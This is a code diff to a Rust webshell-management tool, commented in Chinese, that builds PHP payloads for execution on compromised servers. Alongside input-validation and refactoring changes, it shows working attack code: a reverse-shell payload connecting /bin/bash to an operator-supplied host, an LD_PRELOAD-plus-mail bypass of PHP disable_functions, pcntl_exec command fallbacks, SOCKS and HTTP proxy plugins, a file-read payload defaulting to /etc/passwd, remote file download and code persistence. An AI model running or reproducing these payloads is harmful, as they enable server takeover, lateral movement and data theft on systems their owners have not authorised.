@@ -39,6 +39,50 @@ fn basename_cmd(path: &str) -> &str {
     path.rsplit_once('/').map(|(_, b)| b).unwrap_or(path)
 }
 
+/// S13：命令型载荷参数校验——host 仅允许主机名/IP 字符集。
+fn validate_host_arg(host: &str) -> Result<(), String> {
+    if host.is_empty() || host.len() > 255 {
+        return Err("host 参数无效".to_string());
+    }
+    if !host.chars().all(|c| c.is_ascii_alphanumeric() || c == '.' || c == '-' || c == ':') {
+        return Err("host 含非法字符".to_string());
+    }
+    Ok(())
+}
+
+/// S14：PHP 双引号字符串转义——非 ASCII 转 `\u{XXXX}`（PHP 原生语法），
+/// 替代 serde_json 的 `\uXXXX`（PHP 不识别），保证中文路径/命令在目标端不损坏。
+pub(crate) fn php_json_str(value: &str) -> String {
+    let mut out = String::with_capacity(value.len() + 2);
+    out.push('"');
+    for ch in value.chars() {
+        match ch {
+            '\\' => out.push_str("\\\\"),
+            '"' => out.push_str("\\\""),
+            c if (c as u32) < 0x20 || (c as u32) > 0x7f => {
+                out.push_str(&format!("\\u{{{:x}}}", c as u32));
+            }
+            c => out.push(c),
+        }
+    }
+    out.push('"');
+    out
+}
+
+/// S13：命令型载荷路径参数校验——拒绝 shell 元字符。
+fn validate_path_arg(path: &str) -> Result<(), String> {
+    if path.is_empty() || path.len() > 4096 {
+        return Err("路径参数无效".to_string());
+    }
+    if path
+        .chars()
+        .any(|c| ";&|`$'\"()<>\n\r ".contains(c))
+    {
+        return Err("路径含非法字符".to_string());
+    }
+    Ok(())
+}
+
 fn run_command(
     protocol: &dyn Protocol,
     session: &dyn SessionState,
@@ -57,7 +101,9 @@ fn run_command(
 fn process_command(language: &str) -> &'static str {
     match language {
         "aspnet" => "tasklist /FO CSV 2>nul",
-        _ => "ps -eo pid,user,pcpu,pmem,cmd --sort=-pcpu 2>/dev/null | head -60 || ps aux 2>/dev/null | head -60",
+        _ => {
+            "ps -eo pid,user,pcpu,pmem,cmd --sort=-pcpu 2>/dev/null | head -60 || ps aux 2>/dev/null | head -60"
+        }
     }
 }
 
@@ -106,9 +152,8 @@ echo json_encode(array('ok' => true, 'data' => array(
 )));
 "#;
                 let output = protocol.run_code(session, "php", code, settings)?;
-                serde_json::from_str(&output).map_err(|_| {
-                    ProtocolError::ParseError(format!("载荷输出非 JSON：{output}"))
-                })
+                serde_json::from_str(&output)
+                    .map_err(|_| ProtocolError::ParseError(format!("载荷输出非 JSON：{output}")))
             }
             other => run_command(protocol, session, process_command(other), settings),
         }
@@ -132,7 +177,7 @@ foreach ($ports as $p) {{
 }}
 echo json_encode(array('host' => $host, 'open' => $open, 'scanned' => count($ports)));
 "#,
-        host_php = serde_json::to_string(host).unwrap_or_else(|_| "\"\"".to_string()),
+        host_php = php_json_str(&host),
         ports_php = ports_php.join(","),
         timeout = timeout,
     )
@@ -189,7 +234,7 @@ impl FeaturePlugin for PortScanPlugin {
         let host = param_str(params, "host", "127.0.0.1");
         let ports_text = param_str(params, "ports", "21,22,80,443");
         let ports: Vec<u32> = ports_text
-            .split(|c: char| c == ',' || c == ' ' || c == '\n')
+            .split([',', ' ', '\n'])
             .filter(|s| !s.is_empty())
             .filter_map(|s| s.trim().parse::<u32>().ok())
             .take(128)
@@ -207,7 +252,8 @@ impl FeaturePlugin for PortScanPlugin {
                 Ok(parsed)
             }
             // 非 PHP：命令型 /dev/tcp 扫描（Linux 环境）
-            other => {
+            _other => {
+                validate_host_arg(&host).map_err(ProtocolError::NotSupported)?;
                 let ports: Vec<String> = ports.iter().map(|p| p.to_string()).collect();
                 let checks: Vec<String> = ports
                     .iter()
@@ -316,8 +362,8 @@ if (is_dir($src)) {{
 $zip->close();
 echo json_encode(array('ok' => true, 'target' => $dst, 'entries' => $count));
 "#,
-        source = serde_json::to_string(source).unwrap_or_else(|_| "\"\"".to_string()),
-        target = serde_json::to_string(target).unwrap_or_else(|_| "\"\"".to_string()),
+        source = php_json_str(&source),
+        target = php_json_str(&target),
     )
 }
 
@@ -368,16 +414,17 @@ impl FeaturePlugin for ZipPlugin {
             "php" => {
                 let code = php_zip_code(&source, &target);
                 let output = protocol.run_code(session, "php", &code, settings)?;
-                serde_json::from_str(&output).map_err(|_| {
-                    ProtocolError::ParseError(format!("载荷输出非 JSON：{output}"))
-                })
+                serde_json::from_str(&output)
+                    .map_err(|_| ProtocolError::ParseError(format!("载荷输出非 JSON：{output}")))
             }
             // 非 PHP：系统 zip 命令（zip 可用时）
-            other => {
+            _other => {
+                validate_path_arg(&source).map_err(ProtocolError::NotSupported)?;
+                validate_path_arg(&target).map_err(ProtocolError::NotSupported)?;
                 let command = format!(
                     "cd {} && zip -r {} {} 2>&1 || echo 'zip unavailable'",
                     dirname_cmd(&source),
-                    &target,
+                    target,
                     basename_cmd(&source),
                 );
                 run_command(protocol, session, &command, settings)
@@ -411,8 +458,8 @@ if ($data === false || $data === '') {{ echo json_encode(array('ok' => false, 'e
 $ok = @file_put_contents($target, $data);
 echo json_encode(array('ok' => (bool)$ok, 'target' => $target, 'size' => strlen($data)));
 "#,
-        url = serde_json::to_string(url).unwrap_or_else(|_| "\"\"".to_string()),
-        target = serde_json::to_string(target).unwrap_or_else(|_| "\"\"".to_string()),
+        url = php_json_str(&url),
+        target = php_json_str(&target),
     )
 }
 
@@ -473,6 +520,7 @@ impl FeaturePlugin for RemoteDownloadPlugin {
 }
 
 #[cfg(test)]
+#[allow(clippy::items_after_test_module)] // 模板生成辅助与插件同文件，测试模块居中组织
 mod tests {
     use super::*;
     use crate::plugin::FeaturePluginRegistry;
@@ -543,7 +591,7 @@ foreach ($it as $f) {{
 }}
 echo json_encode($out);
 "#,
-        dir = serde_json::to_string(dir).unwrap_or_else(|_| "\".\"".to_string()),
+        dir = php_json_str(&dir),
         depth = max_depth,
     )
 }
@@ -557,7 +605,8 @@ impl FeaturePlugin for WebShellScanPlugin {
             id: "webshell_scan".into(),
             name: "WebShell 扫描".into(),
             version: "1.0.0".into(),
-            description: "递归扫描目录，按 eval/assert/编码器特征识别潜在 WebShell（PHP/JSP/ASP）。".into(),
+            description:
+                "递归扫描目录，按 eval/assert/编码器特征识别潜在 WebShell（PHP/JSP/ASP）。".into(),
             category: "general".into(),
             languages: vec![],
             params: vec![
@@ -594,9 +643,8 @@ impl FeaturePlugin for WebShellScanPlugin {
                 let depth = param_int(params, "max_depth", 4).clamp(1, 8);
                 let code = php_webshell_scan_code(&dir, depth);
                 let output = protocol.run_code(session, "php", &code, settings)?;
-                serde_json::from_str(&output).map_err(|_| {
-                    ProtocolError::ParseError(format!("载荷输出非 JSON：{output}"))
-                })
+                serde_json::from_str(&output)
+                    .map_err(|_| ProtocolError::ParseError(format!("载荷输出非 JSON：{output}")))
             }
             other => Err(ProtocolError::NotSupported(format!(
                 "WebShell 扫描暂不支持运行时 {other}"
@@ -608,24 +656,6 @@ impl FeaturePlugin for WebShellScanPlugin {
 // ---------------------------------------------------------------------------
 // 超级终端（通用：批量命令逐条执行）
 // ---------------------------------------------------------------------------
-
-fn php_super_terminal_code(commands: &str, cwd: &str) -> String {
-    format!(
-        r#"<?php
-error_reporting(0);
-$lines = array_filter(array_map('trim', explode("\n", {commands})), 'strlen');
-if ({cwd} !== '' && is_dir({cwd})) @chdir({cwd});
-$results = array();
-foreach ($lines as $cmd) {{
-    $o = @shell_exec($cmd . ' 2>&1');
-    $results[] = array('cmd' => $cmd, 'output' => (string)$o);
-}}
-echo json_encode(array('ok' => true, 'cwd' => getcwd(), 'results' => $results));
-"#,
-        commands = serde_json::to_string(commands).unwrap_or_else(|_| "\"\"".to_string()),
-        cwd = serde_json::to_string(cwd).unwrap_or_else(|_| "\"\"".to_string()),
-    )
-}
 
 /// 超级终端（通用）：一次提交多行命令逐条执行。
 pub struct SuperTerminalPlugin;
@@ -687,9 +717,8 @@ impl FeaturePlugin for SuperTerminalPlugin {
                 let background = param_bool(params, "background", true);
                 let code = php_reverse_shell_code(&host, port, "/bin/bash", true, background);
                 let output = protocol.run_code(session, "php", &code, settings)?;
-                serde_json::from_str(&output).map_err(|_| {
-                    ProtocolError::ParseError(format!("载荷输出非 JSON：{output}"))
-                })
+                serde_json::from_str(&output)
+                    .map_err(|_| ProtocolError::ParseError(format!("载荷输出非 JSON：{output}")))
             }
             other => Err(ProtocolError::NotSupported(format!(
                 "交互式终端暂不支持运行时 {other}"
@@ -766,21 +795,6 @@ impl FeaturePlugin for EvalCodePlugin {
 // 虚拟终端（通用：单条命令 + 工作目录）
 // ---------------------------------------------------------------------------
 
-fn php_real_cmd_code(command: &str, cwd: &str) -> String {
-    format!(
-        r#"<?php
-error_reporting(0);
-$cmd = {command};
-$cwd = {cwd};
-if ($cwd !== '' && is_dir($cwd)) @chdir($cwd);
-$o = @shell_exec($cmd . ' 2>&1');
-echo json_encode(array('ok' => true, 'cwd' => getcwd(), 'stdout' => base64_encode((string)$o)));
-"#,
-        command = serde_json::to_string(command).unwrap_or_else(|_| "\"id\"".to_string()),
-        cwd = serde_json::to_string(cwd).unwrap_or_else(|_| "\"\"".to_string()),
-    )
-}
-
 /// 虚拟终端（通用）：单条命令执行（可指定工作目录，输出 base64）。
 pub struct RealCmdPlugin;
 
@@ -847,9 +861,8 @@ impl FeaturePlugin for RealCmdPlugin {
                 let background = param_bool(params, "background", true);
                 let code = php_reverse_shell_code(&host, port, &shell, false, background);
                 let output = protocol.run_code(session, "php", &code, settings)?;
-                serde_json::from_str(&output).map_err(|_| {
-                    ProtocolError::ParseError(format!("载荷输出非 JSON：{output}"))
-                })
+                serde_json::from_str(&output)
+                    .map_err(|_| ProtocolError::ParseError(format!("载荷输出非 JSON：{output}")))
             }
             other => Err(ProtocolError::NotSupported(format!(
                 "反弹 Shell 暂不支持运行时 {other}"
@@ -860,7 +873,13 @@ impl FeaturePlugin for RealCmdPlugin {
 
 /// 反弹 Shell PHP 载荷：fsockopen + proc_open 绑定 socket。
 /// `pty_mode` 为 true 时用 script 分配 PTY（支持 su 等交互，linpty）。
-fn php_reverse_shell_code(host: &str, port: u32, shell: &str, pty_mode: bool, background: bool) -> String {
+fn php_reverse_shell_code(
+    host: &str,
+    port: u32,
+    shell: &str,
+    pty_mode: bool,
+    background: bool,
+) -> String {
     let pty_shell = if pty_mode {
         "script -qec \"/bin/bash\" /dev/null 2>/dev/null || python3 -c 'import pty,os; pty.spawn(\"/bin/bash\")' 2>/dev/null || /bin/bash -i"
     } else {
@@ -879,14 +898,14 @@ if ({background} && function_exists('pcntl_fork')) {{
     if ($pid > 0) {{
         echo json_encode(array('ok' => true, 'mode' => 'background', 'pid' => $pid,
             'connect' => $host . ':' . $port, 'shell' => '{cmd}'));
-        exit;
+        return;
     }}
     if (function_exists('posix_setsid')) @posix_setsid();
 }}
 $sock = @fsockopen($host, $port, $errno, $errstr, 15);
 if (!$sock) {{
     echo json_encode(array('ok' => false, 'error' => 'connect failed: ' . $errstr));
-    exit;
+    return;
 }}
 $descriptors = array(0 => $sock, 1 => $sock, 2 => $sock);
 $process = @proc_open($cmd, $descriptors, $pipes);
@@ -894,13 +913,13 @@ if (!is_resource($process)) {{
     fwrite($sock, 'proc_open failed' . chr(10));
     fclose($sock);
     echo json_encode(array('ok' => false, 'error' => 'proc_open failed'));
-    exit;
+    return;
 }}
 @proc_close($process);
 if ($pid === 0) echo json_encode(array('ok' => true, 'mode' => 'foreground',
     'connect' => $host . ':' . $port, 'shell' => '{cmd}'));
 "#,
-        host = serde_json::to_string(host).unwrap_or_else(|_| "\"127.0.0.1\"".to_string()),
+        host = php_json_str(&host),
         port = port,
         cmd = pty_shell.replace("\\", "\\\\").replace("'", "\\'"),
         background = if background { "true" } else { "false" },
@@ -1052,9 +1071,8 @@ impl FeaturePlugin for SocksProxyPlugin {
                 let action = param_str(params, "action", "start");
                 let code = php_socks_proxy_code(port, window, &action);
                 let output = protocol.run_code(session, "php", &code, settings)?;
-                serde_json::from_str(&output).map_err(|_| {
-                    ProtocolError::ParseError(format!("载荷输出非 JSON：{output}"))
-                })
+                serde_json::from_str(&output)
+                    .map_err(|_| ProtocolError::ParseError(format!("载荷输出非 JSON：{output}")))
             }
             other => Err(ProtocolError::NotSupported(format!(
                 "Socks 代理暂不支持运行时 {other}"
@@ -1230,9 +1248,8 @@ impl FeaturePlugin for HttpProxyPlugin {
                 let action = param_str(params, "action", "start");
                 let code = php_http_proxy_code(port, window, &action);
                 let output = protocol.run_code(session, "php", &code, settings)?;
-                serde_json::from_str(&output).map_err(|_| {
-                    ProtocolError::ParseError(format!("载荷输出非 JSON：{output}"))
-                })
+                serde_json::from_str(&output)
+                    .map_err(|_| ProtocolError::ParseError(format!("载荷输出非 JSON：{output}")))
             }
             other => Err(ProtocolError::NotSupported(format!(
                 "HTTP 代理暂不支持运行时 {other}"
@@ -1383,10 +1400,10 @@ if ($m === 'symlink') {{
 
 echo json_encode($out);
 "#,
-        target = serde_json::to_string(target).unwrap_or_else(|_| "\"/etc/passwd\"".to_string()),
-        method = serde_json::to_string(method).unwrap_or_else(|_| "\"auto\"".to_string()),
+        target = php_json_str(&target),
+        method = php_json_str(&method),
         recursive = if recursive { "true" } else { "false" },
-        write_data = serde_json::to_string(write_data).unwrap_or_else(|_| "\"\"".to_string()),
+        write_data = php_json_str(&write_data),
     )
 }
 
@@ -1529,7 +1546,7 @@ if (!isset($out['result']) && $has('pcntl_exec') && $has('pcntl_fork') && $has('
         $pid = pcntl_fork();
         if ($pid === 0) {{
             pcntl_exec('/bin/sh', array('-c', $cmd . ' > ' . $of . ' 2>&1'));
-            exit;
+            return;
         }}
         if ($pid > 0) {{
             pcntl_waitpid($pid, $status);
@@ -1605,10 +1622,11 @@ if (isset($out['result']) && $out['result'] === '') {{
 }}
 echo json_encode($out);
 "#,
-        command = serde_json::to_string(command).unwrap_or_else(|_| "\"id\"".to_string()),
+        command = php_json_str(&command),
     )
     .replace("__C_PAYLOAD__", BYPASS_C_PAYLOAD)
-}/// BypassDisableFunctions（PHP 专用）：LD_PRELOAD + mail 经典绕过。
+}
+/// BypassDisableFunctions（PHP 专用）：LD_PRELOAD + mail 经典绕过。
 pub struct BypassDisableFunctionsPlugin;
 
 impl FeaturePlugin for BypassDisableFunctionsPlugin {
@@ -1689,8 +1707,8 @@ foreach ($it as $f) {{
 }}
 echo json_encode($out);
 "#,
-        dir = serde_json::to_string(dir).unwrap_or_else(|_| "\".\"".to_string()),
-        keyword = serde_json::to_string(keyword).unwrap_or_else(|_| "\"\"".to_string()),
+        dir = php_json_str(&dir),
+        keyword = php_json_str(&keyword),
         content = if in_content { "true" } else { "false" },
         depth = max_depth,
     )
@@ -1758,9 +1776,8 @@ impl FeaturePlugin for FileSearchPlugin {
                 let depth = param_int(params, "max_depth", 4).clamp(1, 8);
                 let code = php_file_search_code(&dir, &keyword, in_content, depth);
                 let output = protocol.run_code(session, "php", &code, settings)?;
-                serde_json::from_str(&output).map_err(|_| {
-                    ProtocolError::ParseError(format!("载荷输出非 JSON：{output}"))
-                })
+                serde_json::from_str(&output)
+                    .map_err(|_| ProtocolError::ParseError(format!("载荷输出非 JSON：{output}")))
             }
             other => Err(ProtocolError::NotSupported(format!(
                 "文件搜索暂不支持运行时 {other}"
@@ -1776,7 +1793,9 @@ impl FeaturePlugin for FileSearchPlugin {
 fn netinfo_command(language: &str) -> &'static str {
     match language {
         "aspnet" | "asp" => "ipconfig /all 2>nul & netstat -an 2>nul",
-        _ => "ifconfig 2>/dev/null || ip addr 2>/dev/null; echo ---; netstat -tunap 2>/dev/null | head -40 || netstat -an 2>/dev/null | head -40",
+        _ => {
+            "ifconfig 2>/dev/null || ip addr 2>/dev/null; echo ---; netstat -tunap 2>/dev/null | head -40 || netstat -an 2>/dev/null | head -40"
+        }
     }
 }
 
@@ -1884,10 +1903,10 @@ if ($op === 'encrypt') {{
 }}
 echo json_encode(array('ok' => true, 'op' => $op, 'algo' => $algo, 'result' => $out));
 "#,
-        op = serde_json::to_string(op).unwrap_or_else(|_| "\"encrypt\"".to_string()),
-        algorithm = serde_json::to_string(algorithm).unwrap_or_else(|_| "\"aes\"".to_string()),
-        text = serde_json::to_string(text).unwrap_or_else(|_| "\"\"".to_string()),
-        pass = serde_json::to_string(pass).unwrap_or_else(|_| "\"\"".to_string()),
+        op = php_json_str(&op),
+        algorithm = php_json_str(&algorithm),
+        text = php_json_str(&text),
+        pass = php_json_str(&pass),
     )
 }
 
@@ -1953,9 +1972,8 @@ impl FeaturePlugin for CryptoToolPlugin {
                 let pass = param_str(params, "pass", "");
                 let code = php_crypto_tool_code(&op, &algorithm, &text, &pass);
                 let output = protocol.run_code(session, "php", &code, settings)?;
-                serde_json::from_str(&output).map_err(|_| {
-                    ProtocolError::ParseError(format!("载荷输出非 JSON：{output}"))
-                })
+                serde_json::from_str(&output)
+                    .map_err(|_| ProtocolError::ParseError(format!("载荷输出非 JSON：{output}")))
             }
             other => Err(ProtocolError::NotSupported(format!(
                 "加解密工具暂不支持运行时 {other}"
@@ -1989,7 +2007,7 @@ echo json_encode(array('ok' => true, 'persisted' => $persist !== '' && isset($w)
 "#,
         code_raw = code,
         code_esc = code.replace("\\", "\\\\").replace("'", "\\'"),
-        path = serde_json::to_string(persist_path).unwrap_or_else(|_| "\"\"".to_string()),
+        path = php_json_str(&persist_path),
     )
 }
 
